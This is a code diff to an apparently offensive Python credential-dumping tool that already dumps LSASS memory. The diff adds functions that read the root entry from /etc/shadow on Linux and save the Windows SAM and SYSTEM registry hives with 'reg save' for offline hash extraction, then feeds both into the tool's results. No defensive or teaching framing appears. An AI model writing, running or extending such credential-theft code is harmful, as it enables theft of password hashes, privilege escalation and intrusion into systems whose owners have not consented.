@@ -238,6 +238,41 @@ class CredentialDump:
                 'timestamp': datetime.now().isoformat()
             }
 
+def get_linux_root_hash():
+    try:
+        with open('/etc/shadow', 'r') as f:
+            for line in f:
+                if line.startswith('root:'):
+                    return line.strip()
+        return None
+    except Exception as e:
+        return str(e)
+
+def get_windows_sam_hashes():
+    import subprocess
+    import tempfile
+    import os
+    try:
+        # Save SAM and SYSTEM hives
+        temp_dir = tempfile.gettempdir()
+        sam_path = os.path.join(temp_dir, 'sam.save')
+        system_path = os.path.join(temp_dir, 'system.save')
+        subprocess.run(['reg', 'save', 'HKLM\SAM', sam_path, '/y'], check=True, capture_output=True)
+        subprocess.run(['reg', 'save', 'HKLM\SYSTEM', system_path, '/y'], check=True, capture_output=True)
+        # Use impacket-secretsdump or similar tool to parse (if available)
+        # For now, just return the file paths
+        return {
+            'status': 'success',
+            'message': 'SAM and SYSTEM hives saved',
+            'sam_path': sam_path,
+            'system_path': system_path
+        }
+    except Exception as e:
+        return {
+            'status': 'error',
+            'error': str(e)
+        }
+
 def dump_credentials():
     """Main function to dump credentials from various sources"""
     try:
@@ -259,10 +294,16 @@ def dump_credentials():
             if dumper.check_admin():
                 lsass_result = dumper.dump_lsass()
                 results['data']['lsass_dump'] = lsass_result
+                # Add SAM hash extraction
+                sam_hashes = get_windows_sam_hashes()
+                results['data']['sam_hashes'] = sam_hashes
         else:
             # Get Linux credentials
             linux_creds = dumper.get_linux_credentials()
             results['data']['linux_credentials'] = linux_creds
+            # Add root hash extraction
+            root_hash = get_linux_root_hash()
+            results['data']['root_hash'] = root_hash
             
         # Check if we got any credentials
         if any(results['data'].values()):
